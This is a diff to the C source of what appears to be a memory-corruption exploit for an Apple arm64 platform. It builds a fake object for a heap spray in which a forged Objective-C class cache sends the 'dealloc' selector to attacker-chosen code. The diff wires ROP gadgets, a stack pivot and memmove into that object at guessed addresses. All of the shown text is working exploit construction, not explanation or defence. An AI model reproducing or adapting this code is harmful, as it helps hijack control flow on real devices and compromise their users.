@@ -145,34 +145,56 @@ f9400108 ldr x8, [x8]
 d63f0100 blr x8
 */
 
+fake_30 = &fake + GUESS_SHIFT + 0x10;
+fake_38 = &fake + GUESS_SHIFT + 0x18;
+fake_40 = &fake + GUESS_SHIFT + 0x20;
 fake_48 = &fake + GUESS_SHIFT + 0x28;
-*fake_48 = gadget_pivot_from_10;
-fake_d0 = &fake + GUESS_SHIFT + 0x20 + 0x90;
-*fake_d0 = GUESS_ADDR + 0x80;
 fake_80 = &fake + 0x80;
-*fake_80 = GUESS_ADDR;
+fake_a0 = &fake + 0x80 + 0x20;
+fake_a8 = &fake + 0x80 + 0x28;
+fake_b0 = &fake + 0x80 + 0x30;
+// fake_b8 = &fake + 0x80 + 0x38;
 fake_c8 = &fake + 0xc8;
+fake_d0 = &fake + GUESS_SHIFT + 0x20 + 0x90;
+fake_e0 = &fake + 0xe0 + 0x00;
+fake_f0 = &fake + 0xe0 + 0x10;
+
+#if 0
+struct heap_spray {
+    void *fake_objc_class_ptr;      // isa ---+
+    // ...                          //        |
+};                                  //        |
+                                    //        |
+struct fake {                       // guess  |
+    char shift[GUESS_SHIFT];        //        |
+    struct fake_objc_class_t {      // <------+
+        char pad[16];
+        void *cache_buckets_ptr;    // -------+
+        uint64_t cache_bucket_mask; // 0      |
+    } fake_objc_class;              //        |
+    // ...                          //        |
+    struct fake_cache_bucket_t {    // <------+
+        void *cached_sel;           // sel_registerName("dealloc")
+        void *cached_function;      // pc
+    } fake_cache_bucket;
+};
+#endif
+
+*fake_48 = gadget_pivot_from_10;
+*fake_d0 = GUESS_ADDR + 0x80;
+*fake_80 = GUESS_ADDR;
 *fake_c8 = gadget_jmp_4args;
 
-fake_a0 = &fake + 0x80 + 0x20;
 *fake_a0 = GUESS_ADDR + 0xe0;
-fake_a8 = &fake + 0x80 + 0x28;
 *fake_a8 = GUESS_ADDR + STAGE3_FAKE_OBJECT_SZ + 8;
-fake_b0 = &fake + 0x80 + 0x30;
 *fake_b0 = STAGE3_USEFUL_SIZE;
-// fake_b8 = &fake + 0x80 + 0x38;
 // *fake_b8 = 0x7a7a7a7a7a7a7a7a;
 
-fake_f0 = &fake + 0xe0 + 0x10;
 *fake_f0 = gadget_lea_x0_jmp_x8;
-fake_e0 = &fake + 0xe0 + 0x00;
 *fake_e0 = _platform_memmove_plus4; // _platform_memmove + 4
 
-fake_30 = &fake + GUESS_SHIFT + 0x10;
 *fake_30 = GUESS_ADDR + GUESS_SHIFT + 0x20;
-fake_38 = &fake + GUESS_SHIFT + 0x18;
 *fake_38 = 0;
-fake_40 = &fake + GUESS_SHIFT + 0x20;
 *fake_40 = sel_registerName("dealloc");
 
 // Generate a large mapping consisting of many copies of the given data. Note that changes to the
